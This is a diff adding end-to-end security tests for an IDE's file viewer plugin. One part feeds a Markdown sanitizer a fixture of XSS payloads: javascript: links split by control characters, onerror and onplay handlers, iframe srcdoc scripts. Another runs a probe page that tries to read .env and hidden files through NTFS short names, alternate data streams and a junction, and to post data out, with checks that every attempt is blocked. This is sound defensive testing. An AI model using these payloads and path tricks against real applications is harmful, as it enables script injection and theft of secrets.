@@ -1,9 +1,11 @@
 // End-to-end check for the File Viewers plugin (renderer/features/viewers, main/features/viewers.js).
 // Fixtures: verify/fixtures/viewers (binary files come from make_fixtures.py there).
-import { existsSync, readFileSync, writeFileSync } from 'fs';
+import { execSync } from 'child_process';
+import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'fs';
+import { createServer } from 'http';
 import path from 'path';
 import { fileURLToPath } from 'url';
-import { launch, openFile } from './lib.mjs';
+import { launch, openFile, SANITIZED_HANDLER } from './lib.mjs';
 
 const PORT = 9480;
 const FIX = path.join(path.dirname(fileURLToPath(import.meta.url)), 'fixtures', 'viewers');
@@ -327,6 +329,112 @@ try {
   check(bgPix.every((v) => v > 240), `waveform uses the light background (${bgPix})`);
   await shot('light.png');
   await js(`ide.settings.set('appearance.theme', 'dark')`);
+
+  // ---------- Markdown sanitizer: an allowlist that keeps ordinary documents whole ----------
+  writeFileSync(path.join(t.project, 'docs', 'hostile.md'), `# Allowed
+
+| a | b |
+| - | - |
+| 1 | 2 |
+
+- [x] done
+- [ ] open
+
+\`\`\`python
+print(1)
+\`\`\`
+
+[site](https://example.com/x) [table](../data/table.csv) [anchor](#allowed)
+
+![pic](../images/sample.png)
+
+<details open><summary>more</summary>inside</details>
+
+<svg id="svgUse"><use href="other.svg#x"></use><a xlink:href="javascript:window.__mdInjected = 1"><text>t</text></a><animate attributeName="href" to="javascript:1"/></svg>
+<math id="mathNode"><mtext>m</mtext></math>
+<style>body { display: none; }</style>
+<form action="https://example.com/"><button>go</button></form>
+<iframe srcdoc="<script>parent.__mdInjected = 1</script>"></iframe>
+<a id="ctlLink" href="java&#10;script:window.__mdInjected = 1">control character link</a>
+<a id="dataLink" href="data:text/html,x">data link</a>
+<img id="bigImg" src="../images/sample.png" onerror="window.__mdInjected = 1" style="position: fixed" class="x" srcset="other.png 1x">
+<div id="styled" style="position: fixed" class="monaco-editor" data-x="1">styled</div>
+<video id="clip" src="clip.mp4" controls onplay="window.__mdInjected = 1"></video>
+<section>unwrapped text</section>
+`);
+  await openFile(t, 'docs/hostile.md');
+  const P = `${H}.querySelector('.vw-md-preview')`;
+  await until(`${P}?.querySelector('#styled')`, 'hostile markdown preview', 15000);
+  check(await js(`!${P}.querySelector('svg, use, math, style, form, button, iframe, animate')`), 'svg, math, style, form and iframe are dropped');
+  check(await js(`window.__mdInjected === undefined`), 'nothing in the document ran');
+  check(await js(`!${P}.querySelector('#ctlLink').hasAttribute('href') && !${P}.querySelector('#dataLink').hasAttribute('href') && ${P}.querySelector('#ctlLink').classList.contains('vw-md-dead-link')`), 'links with a control character in the scheme and data: links lose their href');
+  const attrs = (id) => js(`[...${P}.querySelector('#${id}').attributes].map((a) => a.name).filter((n) => n !== 'data-line').sort().join()`);
+  check(await attrs('bigImg') === 'id,src' && await js(`${P}.querySelector('#bigImg').src.startsWith('file:')`), `an image keeps its source and no handler, style, class or srcset (${await attrs('bigImg')})`);
+  check(await attrs('styled') === 'id', `a div keeps no style, class or data attribute of its own (${await attrs('styled')})`);
+  check(await js(`${P}.textContent.includes('unwrapped text') && !${P}.querySelector('section')`), 'an element outside the list is unwrapped, its text stays');
+  check(await js(`${P}.querySelector('#clip').hasAttribute('controls') && !${P}.querySelector('#clip').hasAttribute('onplay')`), 'video keeps its controls');
+  check(await js(`${P}.querySelectorAll('table td').length`) === 2, 'tables render');
+  await until(`${P}.querySelector('pre code span[class^="mtk"]')`, 'fence colorized', 5000).then(() => check(true, 'fenced code keeps its language and is highlighted'), () => check(false, 'fenced code keeps its language and is highlighted'));
+  check(await js(`(() => { const b = [...${P}.querySelectorAll('li input[type="checkbox"]')]; return b.length === 2 && b.every((x) => x.disabled) && b[0].checked && !b[1].checked; })()`), 'task lists show disabled checkboxes');
+  check(await js(`[...${P}.querySelectorAll('a')].filter((a) => a.getAttribute('href')).map((a) => a.getAttribute('href')).join()`) === 'https://example.com/x,../data/table.csv,#allowed', 'http, relative and anchor links stay');
+  await until(`${P}.querySelector('img[alt="pic"]')?.naturalWidth === 64`, 'relative image', 5000);
+  check(await js(`${P}.querySelector('details').open && ${P}.querySelector('h1').id === 'allowed'`), 'details and heading anchors stay');
+
+  // ---------- HTML preview: what a page can read and send ----------
+  const SECRET = 'hidden-value-7f3a';
+  const received = [];
+  const server = createServer((req, res) => { received.push(`${req.method} ${req.url}`); res.setHeader('access-control-allow-origin', '*'); res.end('ok'); });
+  await new Promise((r) => server.listen(0, '127.0.0.1', r));
+  const remote = `http://127.0.0.1:${server.address().port}`;
+  const site = path.join(t.project, 'site');
+  mkdirSync(path.join(site, '.private'), { recursive: true });
+  writeFileSync(path.join(site, '.env'), `KEY=${SECRET}\n`);
+  writeFileSync(path.join(site, '.private', 'note.txt'), SECRET);
+  writeFileSync(path.join(site, 'config.json'), '{"ok":true}\n');
+  execSync(`mklink /J "${path.join(site, 'door')}" "${path.join(site, '.private')}"`, { shell: 'cmd.exe', stdio: 'ignore' });
+  writeFileSync(path.join(site, 'probe.html'), `<!doctype html><script>
+addEventListener('message', async (e) => {
+  const read = async (u) => { try { const r = await fetch(u); return { status: r.status, text: await r.text() }; } catch { return { status: 'blocked', text: '' }; } };
+  const send = async () => {
+    const tried = [];
+    for (const go of [() => fetch(e.data.remote + '/fetch', { method: 'POST', body: 'x', mode: 'no-cors' }), () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('POST', e.data.remote + '/xhr'); x.onload = res; x.onerror = rej; x.send('x'); })]) {
+      tried.push(await go().then(() => 'sent', () => 'blocked'));
+    }
+    tried.push(navigator.sendBeacon(e.data.remote + '/beacon', 'x') ? 'queued' : 'blocked');
+    return tried;
+  };
+  parent.postMessage({ previewProbe: true, reads: await Promise.all(e.data.reads.map(read)), sent: await send() }, '*');
+});
+parent.postMessage({ previewProbe: true, ready: true }, '*');
+</script>\n`);
+  const probePage = await js(`ide.api.invoke('viewers:previewUrl', ${JSON.stringify(path.join(site, 'probe.html'))}, ide.root)`);
+  check(probePage.scripts === true, "a trusted project's pages may run scripts");
+  const shortLine = /(\S+~\S*)\s+\.env\s*$/m.exec(execSync(`dir /x /a "${site}"`, { shell: 'cmd.exe', encoding: 'latin1' }));
+  const short = shortLine?.[1];
+  const reads = ['config.json', '.env', '.private/note.txt', 'door/note.txt', './config.json::$DATA', '.env::$DATA', ...(short ? [short, `${short}::$DATA`, `${short}.`] : [])];
+  const probed = await js(`new Promise((resolve) => {
+    const f = document.createElement('iframe');
+    f.setAttribute('sandbox', 'allow-scripts');
+    f.style.display = 'none';
+    const on = (e) => {
+      if (e.source !== f.contentWindow || !e.data?.previewProbe) return;
+      if (e.data.ready) return e.source.postMessage({ remote: ${JSON.stringify(remote)}, reads: ${JSON.stringify(reads)} }, '*');
+      removeEventListener('message', on); f.remove(); resolve(e.data);
+    };
+    addEventListener('message', on);
+    f.src = ${JSON.stringify(probePage.url)};
+    document.body.appendChild(f);
+  })`);
+  const got = Object.fromEntries(reads.map((r, i) => [r, probed.reads[i]]));
+  check(got['config.json'].status === 200 && got['config.json'].text.includes('ok'), 'a page reads its own site');
+  console.log(short ? `note: .env has the short name ${short} here` : 'note: this volume makes no short names, so ENV~1 is not tried');
+  const leaked = reads.slice(1).filter((r) => got[r].status === 200 || got[r].text.includes(SECRET));
+  check(!leaked.length && reads.slice(1).every((r) => got[r].status === 404 || got[r].status === 'blocked'), `hidden names, a short name, a junction and NTFS streams are refused (${JSON.stringify(reads.slice(1).map((r) => [r, got[r].status]))})`);
+  await sleep(500);
+  check(!received.length && probed.sent.slice(0, 2).every((s) => s === 'blocked'), `a page cannot send data out (${JSON.stringify(probed.sent)}; server saw ${JSON.stringify(received)})`);
+  server.close();
+  await sleep(200);
+  check(t.takeCsp(SANITIZED_HANDLER) > 0, 'the page policy reports the on* attributes of the Markdown documents where the sanitizer read them');
 } catch (err) {
   check(false, err.message);
   await shot('failure.png');
